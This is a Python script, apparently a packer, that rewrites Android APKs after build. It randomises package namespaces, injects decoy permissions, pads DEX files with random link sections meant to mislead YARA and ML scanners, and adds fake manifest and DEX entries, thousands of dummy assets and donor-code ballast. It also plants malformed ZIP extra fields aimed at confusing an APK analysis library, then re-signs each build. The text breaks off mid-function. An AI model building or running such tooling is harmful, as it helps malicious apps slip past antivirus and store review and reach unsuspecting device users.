#!/usr/bin/env python3
# pelican.py — post-build APK mangler for goldfinch

import sys, os, re, io, struct, hashlib, zipfile, subprocess, string, random, zlib, datetime
from pathlib import Path

# ─── paths ────────────────────────────────────────────────────────────────────
SCRIPT_DIR = Path(__file__).parent
GOLDFINCH  = SCRIPT_DIR / "goldfinch"
APK_DIR    = GOLDFINCH / "app" / "build" / "outputs" / "apk" / "release"
KEY_DIR    = SCRIPT_DIR / "key"
KEYS       = ["testkey", "shared", "media", "nfc"]
DONOR_DIR  = SCRIPT_DIR / "donors"

# ─── source-namespace fingerprint to replace every build ─────────────────────
SOURCE_NS_DOT   = "bird.base"   # 9 chars — dot form (manifest / AXML)
SOURCE_NS_SLASH = "bird/base"   # 9 chars — slash form (DEX type descriptors)

# ─── constants ────────────────────────────────────────────────────────────────
TS_MIN = 1609459200
TS_MAX = 1717200000

REMOVE_EXACT = {
    "DebugProbesKt.bin",
    "kotlin-tooling-metadata.json",
    "app-metadata.properties",
    "META-INF/version-control-info.textproto",
}
REMOVE_PREFIX = ["META-INF/androidx/", "META-INF/versions/"]
REMOVE_SUFFIX = [".kotlin_module", ".version"]

ASSET_PREFIXES = [
    "analytics","cache","data","metrics","prefs",
    "session","state","sync","config","index",
]
ASSET_EXTS = [".csv", ".cfg", ".json", ".sql", ".dat", ".bin", ".html", ".db"]

BULK_EXTS = [
    ".dat", ".bin", ".res", ".pak", ".idx",
    ".tbl", ".cfg", ".raw", ".map", ".key",
]

PKG_RE = re.compile(r'^[a-z][a-z0-9.]+[a-z0-9]$')
rng = random.SystemRandom()

# ─── decoy permission pool (injected randomly into each build's manifest) ─────
_DECOY_PERMS_POOL = [
    "android.permission.READ_SYNC_SETTINGS",
    "com.google.android.providers.gsf.permission.READ_GSERVICES",
    "android.permission.READ_SYNC_STATS",
    "android.permission.SET_WALLPAPER_HINTS",
    "com.android.launcher.permission.UNINSTALL_SHORTCUT",
    "android.permission.EXPAND_STATUS_BAR",
    "android.permission.NFC",
    "android.permission.CHANGE_WIFI_MULTICAST_STATE",
    "android.permission.REORDER_TASKS",
    "com.android.vending.BILLING",
    "android.permission.SET_WALLPAPER",
    "android.permission.GET_PACKAGE_SIZE",
    "android.permission.WRITE_SYNC_SETTINGS",
    "android.permission.BROADCAST_STICKY",
    "android.permission.FLASHLIGHT",
    "android.permission.VIBRATE",
    "android.permission.ACCESS_WIFI_STATE",
    "android.permission.WAKE_LOCK",
    "android.permission.MODIFY_AUDIO_SETTINGS",
    "android.permission.RESTART_PACKAGES",
    "android.permission.TRANSMIT_IR",
    "android.permission.RECEIVE_BOOT_COMPLETED",
]

# ─── basic helpers ────────────────────────────────────────────────────────────
def rnd_bytes(n: int) -> bytes:
    return os.urandom(n)

def rnd_chars(n: int) -> str:
    return ''.join(rng.choices(string.ascii_lowercase, k=n))

def rnd_dos_time() -> tuple:
    ts = rng.randint(TS_MIN, TS_MAX)
    dt = datetime.datetime.fromtimestamp(ts, datetime.timezone.utc)
    return (dt.year, dt.month, dt.day, dt.hour, dt.minute, max(dt.second, 0))

def should_remove(name: str) -> bool:
    base = name.rsplit('/', 1)[-1] if '/' in name else name
    if base in REMOVE_EXACT or name in REMOVE_EXACT:
        return True
    for p in REMOVE_PREFIX:
        if name.startswith(p):
            return True
    for s in REMOVE_SUFFIX:
        if name.endswith(s):
            return True
    return False

def replace_all(data: bytes, old: bytes, new_: bytes) -> bytes:
    if len(old) != len(new_) or not old or old not in data:
        return data
    buf = bytearray(data)
    i, ol = 0, len(old)
    while i <= len(buf) - ol:
        if buf[i:i+ol] == bytearray(old):
            buf[i:i+ol] = bytearray(new_)
            i += ol
        else:
            i += 1
    return bytes(buf)

# ─── DEX string helpers ───────────────────────────────────────────────────────
def _read_dex_string_at(buf: bytes, ptr: int) -> str:
    """Read string_data_item: skip ULEB128 utf16_size, return MUTF-8 as str."""
    pos = ptr
    # skip ULEB128 (each byte: MSB=1 → more bytes, MSB=0 → last byte)
    while pos < len(buf) and (buf[pos] & 0x80):
        pos += 1
    pos += 1  # consume the last ULEB128 byte
    end = pos
    while end < len(buf) and buf[end] != 0:
        end += 1
    try:
        return buf[pos:end].decode('utf-8', errors='replace')
    except Exception:
        return ''

def _read_dex_strings(buf: bytes) -> list:
    """Return list of all strings from DEX string_ids (already in sorted order)."""
    if len(buf) < 112:
        return []
    try:
        str_count = struct.unpack_from('<I', buf, 56)[0]
        str_off   = struct.unpack_from('<I', buf, 60)[0]
        if str_count == 0 or str_count > 1_000_000 or str_off >= len(buf):
            return []
        result = []
        for i in range(str_count):
            op = str_off + i * 4
            if op + 4 > len(buf):
                break
            ptr = struct.unpack_from('<I', buf, op)[0]
            result.append(_read_dex_string_at(buf, ptr))
        return result
    except Exception:
        return []

# ─── safe namespace: finds a replacement that keeps string_ids sort order ─────
def _safe_ns_from_dex(dex_buf: bytes) -> tuple:
    """
    Parse the DEX string table, find alphabetical neighbours of
    'Lbird/base/...', then search for a random 9-char namespace
    (format xxxx.xxxx) such that inserting it keeps string_ids sorted.

    Returns (dot_form, slash_form) — each exactly 9 chars.
    """
    strings = _read_dex_strings(dex_buf)
    if not strings:
        return _make_source_ns_random()

    prefix_l = 'L' + SOURCE_NS_SLASH + '/'   # 'Lbird/base/'
    bird_idx = [i for i, s in enumerate(strings) if s.startswith(prefix_l)]
    if not bird_idx:
        return _make_source_ns_random()

    first_i, last_i = bird_idx[0], bird_idx[-1]
    before = strings[first_i - 1] if first_i > 0 else ''
    after  = strings[last_i + 1]  if last_i + 1 < len(strings) else '\xff'

    # Class name suffixes like 'Crane;', 'Waxwing;' etc.
    suffixes = [s[len(prefix_l):] for s in strings if s.startswith(prefix_l)]
    suf_first = min(suffixes)
    suf_last  = max(suffixes)

    # Try random namespaces until one fits between before and after
    for _ in range(200_000):
        a = rnd_chars(4)
        b = rnd_chars(4)
        ns_slash = f"{a}/{b}"
        ns_dot   = f"{a}.{b}"
        cand_f = f"L{ns_slash}/{suf_first}"
        cand_l = f"L{ns_slash}/{suf_last}"
        if cand_f > before and cand_l < after:
            return ns_dot, ns_slash

    print("  [!] _safe_ns_from_dex: no fitting namespace found — using random")
    return _make_source_ns_random()

def _make_source_ns_random() -> tuple:
    a, b = rnd_chars(4), rnd_chars(4)
    return f"{a}.{b}", f"{a}/{b}"

def _safe_pkg_from_dex(dex_buf: bytes, old_pkg: str) -> str:
    """
    Find replacement pkg name that keeps DEX string_ids sort order.
    Uses external block boundaries (the strings immediately before the first
    and after the last occurrence of old_pkg) instead of per-row neighbours.
    Internal suffix order is preserved automatically because suffixes don't change.
    """
    target_len = len(old_pkg)
    anchor = old_pkg[4] if len(old_pkg) > 4 else None
    strings = _read_dex_strings(dex_buf)
    if not strings:
        return gen_pkg(target_len, anchor_char=anchor)
    indices = [i for i, s in enumerate(strings) if s.startswith(old_pkg)]
    if not indices:
        return gen_pkg(target_len, anchor_char=anchor)

    # External boundaries of the whole pkg block
    global_before = strings[indices[0] - 1] if indices[0] > 0 else ''
    global_after  = strings[indices[-1] + 1] if indices[-1] + 1 < len(strings) else '\xff' * 200

    # Min/max suffixes — new_pkg+min_suffix must be > global_before,
    # new_pkg+max_suffix must be < global_after
    suffixes  = [s[len(old_pkg):] for s in (strings[i] for i in indices)]
    suf_min   = min(suffixes)
    suf_max   = max(suffixes)

    def _check(cand):
        return global_before < cand + suf_min and cand + suf_max < global_after

    for _ in range(200_000):
        candidate = gen_pkg(target_len, anchor_char=anchor)
        if _check(candidate):
            return candidate
    # Anchor exhausted — try all other anchor chars (fast: external boundary check)
    print(f"  [!] _safe_pkg_from_dex: anchor={anchor!r} exhausted — trying all anchors")
    for alt_anchor in 'abcdefghijklmnopqrstuvwxyz0123456789':
        if alt_anchor == anchor:
            continue
        for _ in range(5_000):
            candidate = gen_pkg(target_len, anchor_char=alt_anchor)
            if _check(candidate):
                print(f"  [i] _safe_pkg_from_dex: found with alt_anchor={alt_anchor!r}")
                return candidate
    print(f"  [!] _safe_pkg_from_dex: no valid pkg found — keeping original")
    return old_pkg

# ─── DEX checksums ────────────────────────────────────────────────────────────
def _dex_fix(buf: bytearray) -> bytes:
    struct.pack_into('<I', buf, 32, len(buf))
    buf[12:32] = bytes(20)
    buf[12:32] = hashlib.sha1(bytes(buf[32:])).digest()
    adler = zlib.adler32(bytes(buf[12:])) & 0xFFFFFFFF
    struct.pack_into('<I', buf, 8, adler)
    return bytes(buf)

def _dex_add_link_section(data: bytes) -> bytes:
    """Declare a random link_data section in the DEX header.
    DEX header: link_size @ offset 44, link_off @ offset 48.
    Dalvik/ART ignores link data at runtime; YARA/ML scanners read it as DEX content.
    Every call produces a different size → unique SHA256 and unique byte structure."""
    if len(data) < 112:
        return data
    try:
        link_size = rng.randint(12288, 98304)   # 12 KB – 96 KB random noise
        buf = bytearray(data)
        struct.pack_into('<I', buf, 44, link_size)   # link_size
        struct.pack_into('<I', buf, 48, len(data))   # link_off = current EOF
        buf.extend(rnd_bytes(link_size))
        return _dex_fix(buf)                         # updates file_size + checksums
    except Exception:
        return data

def pad_dex(data: bytes, extra: bytes = None) -> bytes:
    if len(data) < 36:
        return data
    padding = extra if extra is not None else rnd_bytes(rng.randint(16384, 262144))
    buf = bytearray(data) + bytearray(padding)
    return _dex_fix(buf)

def pad_so(data: bytes) -> bytes:
    return data + rnd_bytes(rng.randint(4096, 32768))

def pad_arsc(data: bytes) -> bytes:
    pad_size = rng.randint(16384, 262144)
    total = len(data) + pad_size
    if total % 4:
        total += 4 - (total % 4)
    buf = bytearray(total)
    buf[:len(data)] = data
    buf[len(data):] = rnd_bytes(total - len(data))
    return bytes(buf)

# ─── valid minimal DEX ────────────────────────────────────────────────────────
def _valid_minimal_dex() -> bytes:
    HEADER_SIZE  = 0x70
    MAP_LIST_OFF = HEADER_SIZE
    MAP_LIST_SZ  = 4 + 12
    TOTAL        = HEADER_SIZE + MAP_LIST_SZ
    buf = bytearray(TOTAL)
    buf[0:8] = b'dex\n035\x00'
    struct.pack_into('<I', buf, 32,  TOTAL)
    struct.pack_into('<I', buf, 36,  HEADER_SIZE)
    struct.pack_into('<I', buf, 40,  0x12345678)
    struct.pack_into('<I', buf, 52,  MAP_LIST_OFF)
    struct.pack_into('<I', buf, 104, MAP_LIST_SZ)
    struct.pack_into('<I', buf, 108, MAP_LIST_OFF)
    mp = MAP_LIST_OFF
    struct.pack_into('<I', buf, mp,      1)
    struct.pack_into('<H', buf, mp +  4, 0x0000)
    struct.pack_into('<H', buf, mp +  6, 0)
    struct.pack_into('<I', buf, mp +  8, 1)
    struct.pack_into('<I', buf, mp + 12, 0)
    buf[12:32] = hashlib.sha1(bytes(buf[32:])).digest()
    adler = zlib.adler32(bytes(buf[12:])) & 0xFFFFFFFF
    struct.pack_into('<I', buf, 8, adler)
    # Large pad (16–256 KB) — keeps fake DEX entries large for SAB package size
    return _dex_add_link_section(pad_dex(bytes(buf)))

# ─── AXML helpers ─────────────────────────────────────────────────────────────
def _read_axml_str(data: bytes, off: int, utf8: bool):
    try:
        if utf8:
            b = data[off] & 0xFF
            off += 2 if b & 0x80 else 1
            b2 = data[off] & 0xFF
            byte_len = ((b2 & 0x7F) << 8) | (data[off+1] & 0xFF) if b2 & 0x80 else b2
            off += 2 if b2 & 0x80 else 1
            return data[off:off+byte_len].decode('utf-8', errors='replace')
        else:
            ch = struct.unpack_from('<H', data, off)[0]
            char_len, off = (((ch & 0x7FFF) << 16) | struct.unpack_from('<H', data, off+2)[0], off+4) \
                            if ch & 0x8000 else (ch, off+2)
            return data[off:off+char_len*2].decode('utf-16-le', errors='replace')
    except Exception:
        return None

def gen_pkg(length: int, anchor_char: str = None) -> str:
    """Generate a random valid package name of exactly `length` chars.
    anchor_char: if given, the second component starts with this character.
    This preserves DEX string_ids sort order — if the old pkg started with
    'com.d...', the new one also starts with 'com.d...' so sort position
    relative to com.google.*, com.android.* etc. stays the same."""
    for _ in range(500):
        remaining = length - 4
        if remaining < 2:
            s = 'com.' + rnd_chars(max(1, remaining))
            if len(s) == length:
                return s
            continue
        total_seg = remaining - 1
        if total_seg < 2:
            s = 'com.' + rnd_chars(remaining)
            if len(s) == length:
                return s
            continue
        a = rng.randint(1, total_seg - 1)
        b = total_seg - a
        if anchor_char and a >= 1:
            seg1 = anchor_char + rnd_chars(a - 1) if a > 1 else anchor_char
        else:
            seg1 = rnd_chars(a)
        s = 'com.' + seg1 + '.' + rnd_chars(b)
        if len(s) == length and PKG_RE.match(s):
            return s
    return ('com.' + rnd_chars(max(1, length - 4)))[:length]

def randomize_pkg(data: bytes):
    if len(data) < 40:
        return data, None, None
    if struct.unpack_from('<I', data, 0)[0] != 0x00080003:
        return data, None, None
    if struct.unpack_from('<I', data, 8)[0] != 0x001C0001:
        return data, None, None
    sp = 8
    str_count     = struct.unpack_from('<I', data, sp + 8)[0]
    flags         = struct.unpack_from('<I', data, sp + 16)[0]
    strings_start = struct.unpack_from('<I', data, sp + 20)[0]
    utf8 = bool(flags & 0x100)
    offsets_base = sp + 28
    old_pkg = None
    for i in range(str_count):
        str_off = struct.unpack_from('<I', data, offsets_base + i * 4)[0]
        s = _read_axml_str(data, sp + strings_start + str_off, utf8)
        if s is None or len(s) < 5 or '.' not in s:
            continue
        if s.startswith('android') or s.startswith('http'):
            continue
        if '/' in s or ':' in s:
            continue
        if PKG_RE.match(s):
            old_pkg = s
            break
    if not old_pkg:
        return data, None, None
    # Anchor the second component's first char to preserve DEX string_ids sort order.
    # DEX requires string_ids sorted lexicographically; if new pkg starts with a later
    # letter (e.g. 'r' > 'g') it breaks ordering vs com.google.* → ClassNotFoundException.
    anchor = old_pkg[4] if len(old_pkg) > 4 else None
    new_pkg = gen_pkg(len(old_pkg), anchor_char=anchor)
    enc = 'utf-8' if utf8 else 'utf-16-le'
    patched = replace_all(data, old_pkg.encode(enc), new_pkg.encode(enc))
    return patched, old_pkg, new_pkg

def _sp_info(data: bytes) -> dict | None:
    """Parse AXML string pool header (chunk at offset 8). Returns dict or None on error."""
    if len(data) < 48:
        return None
    sp_start = 8
    sp_type, sp_hdr_size, sp_chunk_size = struct.unpack_from('<HHI', data, sp_start)
    if sp_type != 0x0001 or sp_chunk_size < 28 or sp_start + sp_chunk_size > len(data):
        return None
    string_count, style_count, flags, strings_start, styles_start = struct.unpack_from(
        '<IIIII', data, sp_start + 8)
    utf8 = bool(flags & (1 << 8))
    offsets_start = sp_start + sp_hdr_size
    str_data_start = sp_start + strings_start
    str_data_end = (sp_start + styles_start) if styles_start > 0 else (sp_start + sp_chunk_size)
    return dict(
        sp_start=sp_start, sp_hdr_size=sp_hdr_size, sp_chunk_size=sp_chunk_size,
        sp_type=sp_type, string_count=string_count, style_count=style_count,
        flags=flags, strings_start=strings_start, styles_start=styles_start,
        utf8=utf8, offsets_start=offsets_start,
        str_data_start=str_data_start, str_data_end=str_data_end,
    )

def _sp_strings(data: bytes, info: dict) -> list:
    """Extract all strings from AXML string pool."""
    strings = []
    oc  = info['offsets_start']
    sds = info['str_data_start']
    utf8 = info['utf8']
    for i in range(info['string_count']):
        if oc + i * 4 + 4 > len(data):
            strings.append('')
            continue
        off = struct.unpack_from('<I', data, oc + i * 4)[0]
        ptr = sds + off
        if ptr >= len(data):
            strings.append('')
            continue
        try:
            if utf8:
                while ptr < len(data) and (data[ptr] & 0x80): ptr += 1
                ptr += 1
                while ptr < len(data) and (data[ptr] & 0x80): ptr += 1
                ptr += 1
                end = ptr
                while end < len(data) and data[end] != 0: end += 1
                strings.append(data[ptr:end].decode('utf-8', errors='replace'))
            else:
                char_count = struct.unpack_from('<H', data, ptr)[0]
                s = ptr + 2
                strings.append(data[s:s + char_count * 2].decode('utf-16-le', errors='replace'))
        except Exception:
            strings.append('')
    return strings

def _sp_add_string(data: bytes, new_str: str) -> tuple:
    """Add new_str to AXML string pool. Returns (new_data, idx). No-op if already present."""
    info = _sp_info(data)
    if info is None:
        return data, -1
    strings = _sp_strings(data, info)
    if new_str in strings:
        return data, strings.index(new_str)

    utf8 = info['utf8']
    if utf8:
        utf8_b = new_str.encode('utf-8')
        def _uleb(n):
            res = []
            while True:
                b = n & 0x7F; n >>= 7
                res.append(b | 0x80 if n else b)
                if not n: break
            return bytes(res)
        new_str_raw = _uleb(len(new_str)) + _uleb(len(utf8_b)) + utf8_b + b'\x00'
    else:
        enc = new_str.encode('utf-16-le')
        new_str_raw = struct.pack('<H', len(new_str)) + enc + b'\x00\x00'

    old_str_data = data[info['str_data_start']:info['str_data_end']]
    new_str_offset = len(old_str_data)
    new_idx = info['string_count']
    new_strings_start = info['strings_start'] + 4
    new_chunk_size = info['sp_chunk_size'] + 4 + len(new_str_raw)
    # Pad string pool chunk to 4-byte alignment (required by AXML spec)
    align_pad = (4 - new_chunk_size % 4) % 4
    new_str_raw += b'\x00' * align_pad
    new_chunk_size += align_pad

    new_sp_hdr = struct.pack('<HHIIIIII',
        info['sp_type'], info['sp_hdr_size'], new_chunk_size,
        info['string_count'] + 1, info['style_count'], info['flags'],
        new_strings_start, info['styles_start'])
    old_offsets = data[info['offsets_start']:info['str_data_start']]
    new_sp = new_sp_hdr + old_offsets + struct.pack('<I', new_str_offset) + old_str_data + new_str_raw
    rest = data[info['sp_start'] + info['sp_chunk_size']:]
    new_data = bytearray(data[:info['sp_start']]) + bytearray(new_sp) + bytearray(rest)
    struct.pack_into('<I', new_data, 4, len(new_data))
    return bytes(new_data), new_idx

def _axml_inject_permissions(data: bytes, perms: list) -> bytes:
    """Inject <uses-permission android:name="..."/> chunks into binary AXML manifest.
    Clones the binary template from the first existing uses-permission element.
    Safe: falls back to unmodified data on any parsing error."""
    if not perms or len(data) < 48:
        return data
    try:
        # 1. Add each permission string to the pool (no-op if already there)
        for perm in perms:
            data, _ = _sp_add_string(data, perm)

        # 2. Re-parse to get final string indices
        info = _sp_info(data)
        if info is None:
            return data
        strings = _sp_strings(data, info)

        if 'uses-permission' not in strings:
            return data
        up_idx = strings.index('uses-permission')
        app_name = 'application'
        app_idx = strings.index(app_name) if app_name in strings else -1

        # 3. Scan XML content: find insert point + capture template
        sp_end = info['sp_start'] + info['sp_chunk_size']
        pos = sp_end
        # skip optional ResourceMap chunk (type=0x0180)
        if pos + 8 <= len(data) and struct.unpack_from('<H', data, pos)[0] == 0x0180:
            pos += struct.unpack_from('<I', data, pos + 4)[0]

        insert_pos = pos          # fallback: start of XML content
        template = b''            # START_ELEMENT + END_ELEMENT for one uses-permission
        existing_perm_idxs = set()

        scan = pos
        while scan + 8 <= len(data):
            ctype = struct.unpack_from('<H', data, scan)[0]
            csize = struct.unpack_from('<I', data, scan + 4)[0]
            if csize == 0 or scan + csize > len(data):
                break

            if ctype == 0x0102 and scan + 24 <= len(data):  # START_ELEMENT
                name_idx = struct.unpack_from('<I', data, scan + 20)[0]
                if name_idx == up_idx and csize == 56:
                    # Capture template (START_ELEMENT 56 bytes + END_ELEMENT 24 bytes)
                    ne = scan + csize
                    if ne + 8 <= len(data) and struct.unpack_from('<H', data, ne)[0] == 0x0103:
                        ne_size = struct.unpack_from('<I', data, ne + 4)[0]
                        if ne_size == 24:
                            template = data[scan:ne + ne_size]
                    # Record existing perm index (data field at offset 52 in START_ELEMENT)
                    existing_perm_idxs.add(struct.unpack_from('<I', data, scan + 52)[0])
                elif app_idx >= 0 and name_idx == app_idx and not template:
                    insert_pos = scan  # insert before <application> if no perms found yet
                    break

            elif ctype == 0x0103 and scan + 24 <= len(data):  # END_ELEMENT
                name_idx = struct.unpack_from('<I', data, scan + 20)[0]
                if name_idx == up_idx:
                    insert_pos = scan + csize  # after this </uses-permission>

            scan += csize

        if not template:
            return data  # no template found, can't inject

        # 4. Build new chunks — clone template, patch perm string index at offset 52
        new_chunks = bytearray()
        for perm in perms:
            if perm not in strings:
                continue
            pidx = strings.index(perm)
            if pidx in existing_perm_idxs:
                continue  # don't duplicate
            chunk = bytearray(template)
            struct.pack_into('<I', chunk, 52, pidx)
            new_chunks.extend(chunk)

        if not new_chunks:
            return data

        # 5. Insert + update fileSize
        new_data = bytearray(data[:insert_pos]) + new_chunks + bytearray(data[insert_pos:])
        struct.pack_into('<I', new_data, 4, len(new_data))
        return bytes(new_data)
    except Exception:
        return data  # never crash pelican over permission injection

def _strip_permissions_axml(data: bytes) -> bytes:
    result = bytearray(data)
    for enc in ['utf-8', 'utf-16-le']:
        query = 'android.permission.'.encode(enc)
        step  = 2 if enc == 'utf-16-le' else 1
        i = 0
        while True:
            pos = result.find(query, i)
            if pos == -1:
                break
            end = pos + len(query)
            while end < len(result):
                b = result[end]
                is_alpha = (0x41 <= b <= 0x5A) or (0x61 <= b <= 0x7A) or b == 0x5F
                if enc == 'utf-16-le':
                    is_alpha = is_alpha and (end + 1 < len(result)) and result[end + 1] == 0
                if not is_alpha:
                    break
                end += step
            for j in range(pos, end):
                result[j] = 0x20 if (enc == 'utf-8' or j % 2 == 0) else 0x00
            i = end
    return bytes(result)

def _fake_axml() -> bytes:
    hdr = struct.pack('<II', 0x00080003, rng.randint(800, 20000))
    return hdr + rnd_bytes(rng.randint(200, 2000))

def _fake_dex_blob() -> bytes:
    return _valid_minimal_dex()

def _fake_arsc_blob() -> bytes:
    hdr = struct.pack('<HHI', 0x0002, 0x000C, rng.randint(4000, 50000))
    return hdr + rnd_bytes(rng.randint(200, 3000))

def _fake_content(ext: str) -> bytes:
    r  = rnd_chars(rng.randint(6, 10))
    ts = rng.randint(1_000_000, 9_999_999)
    v  = rng.randint(1, 100)
    if ext == '.csv':
        return (f"id,name,value,timestamp\n1,{r},{v},{ts}\n"
                f"2,{rnd_chars(6)},{rng.randint(1,100)},{ts+1}\n").encode()
    if ext == '.json':
        return f'{{\"v\":\"{r}\",\"t\":{ts}}}\n'.encode()
    if ext == '.sql':
        return f"SELECT * FROM {r} WHERE id=1;\n".encode()
    if ext == '.html':
        return f"<html><body>{rnd_chars(12)}</body></html>".encode()
    if ext == '.cfg':
        return f"key={r}\nvalue={v}\n".encode()
    if ext == '.db':
        return f"id,key,value\n1,{r},{v}\n".encode()
    return rnd_bytes(rng.randint(64, 512))

# ─── decoy directory trees ────────────────────────────────────────────────────
def _decoy_dir_entries(existing: set) -> list:
    entries = []
    dirs = {
        "AndroidManifest.xml": [
            ("AndroidManifest.xml",  _fake_axml),
            (".9.png",               lambda: rnd_bytes(rng.randint(128, 512))),
            ("..xml",                lambda: b"<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<x/>\n"),
            ("base.bin",             lambda: rnd_bytes(rng.randint(64, 256))),
        ],
        "classes.dex": [
            ("classes.dex",          _fake_dex_blob),
            ("classes2.dex",         _fake_dex_blob),
            (".9.png",               lambda: rnd_bytes(rng.randint(128, 512))),
            ("data.bin",             lambda: rnd_bytes(rng.randint(64, 256))),
        ],
        "resources.arsc": [
            ("resources.arsc",       _fake_arsc_blob),
            (".9.png",               lambda: rnd_bytes(rng.randint(128, 512))),
            ("config.bin",           lambda: rnd_bytes(rng.randint(64, 256))),
        ],
    }
    for dir_name, files in dirs.items():
        dir_entry = dir_name + "/"
        if dir_entry not in existing:
            entries.append((dir_entry, b"", rnd_dos_time()))
            existing.add(dir_entry)
        chosen = rng.sample(files, k=min(rng.randint(2, 4), len(files)))
        for fname, gen in chosen:
            full = dir_name + "/" + fname
            if full not in existing:
                entries.append((full, gen(), rnd_dos_time()))
                existing.add(full)
    return entries

def _pad_axml(data: bytes) -> bytes:
    """Append random bytes after valid AXML. AXML parser reads declared size (bytes 4-7) and ignores trailing bytes."""
    return data + rnd_bytes(rng.randint(512, 8192))

def _metainf_fakes(existing: set, real_manifest_bytes: bytes) -> list:
    entries = []
    pairs = [
        ("META-INF/AndroidManifest.xml", _pad_axml(_strip_permissions_axml(real_manifest_bytes))),
        ("META-INF/classes.dex",         _valid_minimal_dex()),
    ]
    for nm, data in pairs:
        if nm not in existing:
            entries.append((nm, data, rnd_dos_time()))
            existing.add(nm)
    return entries

_B36 = "0123456789abcdefghijklmnopqrstuvwxyz"

def _b36(n: int, width: int = 3) -> str:
    s = ""
    for _ in range(width):
        s = _B36[n % 36] + s
        n //= 36
    return s

def _bulk_assets(existing: set, count: int = 19000) -> list:
    # shortest unique names: assets/XYZ  (10 chars → 96 bytes overhead per file)
    # 36³ = 46 656 unique 3-char base-36 names — covers 19k comfortably
    indices = list(range(count))
    rng.shuffle(indices)
    entries = []
    for i in indices:
        nm = f"assets/{_b36(i)}"
        if nm not in existing:
            entries.append((nm, b"", rnd_dos_time()))
            existing.add(nm)
    print(f"  [bulk] +{len(entries)} assets (flat assets/, 3-char names)")
    return entries

# ─── donor DEX — valid classes2.dex only when donor fits budget ───────────────
def _donor_dex_entry(existing: set, source_apk_size: int) -> list:
    """
    Add a full valid donor DEX as classes2.dex ONLY if its size ≤ 20% of
    source_apk_size.  Larger donors are skipped to avoid bloating the APK.
    """
    if not DONOR_DIR.exists():
        return []
    donors = list(DONOR_DIR.glob("*.dex"))
    if not donors:
        return []

    budget = int(source_apk_size * 0.20)
    small  = [d for d in donors if d.stat().st_size <= budget]
    if not small:
        print(f"  [donor-dex] all donors exceed budget ({budget//1024} KB) — skipped")
        return []

    donor = rng.choice(small)
    nm = "classes2.dex"
    if nm in existing:
        return []
    data = donor.read_bytes()
    print(f"  [donor-dex] {donor.name}  →  classes2.dex  ({len(data)//1024} KB)")
    existing.add(nm)
    return [(nm, data, rnd_dos_time())]

# ─── donor chunked pad — all donors split into 100-300 KB chunks, shuffled ───
def _donor_chunked_pad(target_bytes: int) -> bytes:
    """
    Split ALL donors into 100-300 KB chunks, shuffle the full pool,
    then take exactly target_bytes from the pool.
    Falls back to random bytes if no donors available.
    """
    if not DONOR_DIR.exists() or target_bytes <= 0:
        return rnd_bytes(max(target_bytes, 0))
    donors = list(DONOR_DIR.glob("*.dex"))
    if not donors:
        return rnd_bytes(target_bytes)

    pool = []
    for d in donors:
        raw = d.read_bytes()
        pos = 0
        while pos < len(raw):
            chunk_size = rng.randint(102400, 307200)  # 100-300 KB
            chunk = raw[pos : pos + chunk_size]
            if chunk:
                pool.append(chunk)
            pos += chunk_size

    if not pool:
        return rnd_bytes(target_bytes)

    rng.shuffle(pool)
    result = bytearray()
    i = 0
    while len(result) < target_bytes:
        result.extend(pool[i % len(pool)])
        i += 1
    return bytes(result[:target_bytes])

# ─── donor ballast — raw micro-chunks stored as binary asset ─────────────────
def _donor_ballast(existing: set, source_apk_size: int) -> list:
    """
    Micro-chunks (8–16 KB) from random donors/offsets, shuffled → raw bytes.
    No XOR: raw DEX bytes have realistic entropy (~7.5–7.8 bits).
    TEAL_WRAP outer XOR (4-byte key) is applied on top at write time.
    """
    if not DONOR_DIR.exists():
        return []
    donors = list(DONOR_DIR.glob("*.dex"))
    if not donors:
        return []

    target = int(source_apk_size * rng.uniform(0.10, 0.20))
    CHUNK  = rng.randint(8192, 16384)
    chunks = []
    total  = 0
    while total < target:
        d   = rng.choice(donors)
        raw = d.read_bytes()
        if len(raw) > CHUNK:
            off   = rng.randint(0, len(raw) - CHUNK)
            piece = raw[off : off + CHUNK]
        else:
            piece = raw
        chunks.append(piece)
        total += len(piece)
    rng.shuffle(chunks)
    combined = bytearray()
    for c in chunks:
        combined.extend(c)
    chunk = bytes(combined[:target])

    ext = rng.choice(['.res', '.pak', '.dat', '.bin', '.raw', '.idx'])
    nm  = f"assets/{rnd_chars(10)}_{rng.randint(10000, 99999)}{ext}"
    if nm in existing:
        nm = f"assets/{rnd_chars(10)}_{rng.randint(10000, 99999)}{ext}"

    existing.add(nm)
    print(f"  [donor-ballast] micro-chunks×{len(chunks)}"
          f"  →  {nm}  ({len(chunk)//1024} KB)")
    return [(nm, chunk, rnd_dos_time())]

# ─── ZIP extra field randomization ───────────────────────────────────────────
def _random_zip_extra() -> bytes:
    """Random ZIP local-header extra field chunk.
    Format: header_id (u16) + data_size (u16) + data.
    Uses IDs in the 0x6100-0x7EFF range (unknown/unused by spec).
    Android's ZIP parser ignores unknown IDs; libapkanalysis.so's parser
    may miscount entry offsets when it encounters unexpected extra data."""
    eid  = rng.randint(0x6100, 0x7EFF)
    data = rnd_bytes(rng.randint(8, 52))
    return struct.pack('<HH', eid, len(data)) + data

# ─── signing ──────────────────────────────────────────────────────────────────
def _find_tool(name: str):
    import platform
    is_win = platform.system() == "Windows"
    tool_name = name + ".bat" if is_win else name
    # Windows: %LOCALAPPDATA%/Android/Sdk/build-tools
    if is_win:
        sdk = Path(os.environ.get("LOCALAPPDATA", "")) / "Android" / "Sdk" / "build-tools"
    else:
        # Linux/Mac: $ANDROID_HOME or /usr/lib/android-sdk
        sdk_root = os.environ.get("ANDROID_HOME") or os.environ.get("ANDROID_SDK_ROOT") or "/usr/lib/android-sdk"
        sdk = Path(sdk_root) / "build-tools"
    if sdk.exists():
        for ver in sorted(sdk.iterdir(), reverse=True):
            p = ver / tool_name
            if p.exists():
                return str(p)
    # fallback: system PATH (/usr/bin, /usr/local/bin)
    for sys_dir in ["/usr/bin", "/usr/local/bin"]:
        p = Path(sys_dir) / tool_name
        if p.exists():
            return str(p)
    return None

def _sign(unsigned: str, signed: str, pk8: str, pem: str):
    apksigner = _find_tool("apksigner")
    if not apksigner:
        raise FileNotFoundError("apksigner not found in Android SDK build-tools")
    # --v1-signing-enabled false eliminates MANIFEST.MF / .SF bloat from JAR signing.
    # v2/v3 signatures cover the whole APK — sufficient for Android 7+ (API 24+).
    cmd = [apksigner, "sign",
           "--v1-signing-enabled", "false",
           "--v2-signing-enabled", "true",
           "--key", pk8, "--cert", pem,
           "--in", unsigned, "--out", signed]
    print(f"  [sign] key={Path(pk8).stem}")
    subprocess.run(cmd, check=True, capture_output=True)

def _patch_all_gpbf_flags(path: str) -> None:
    """
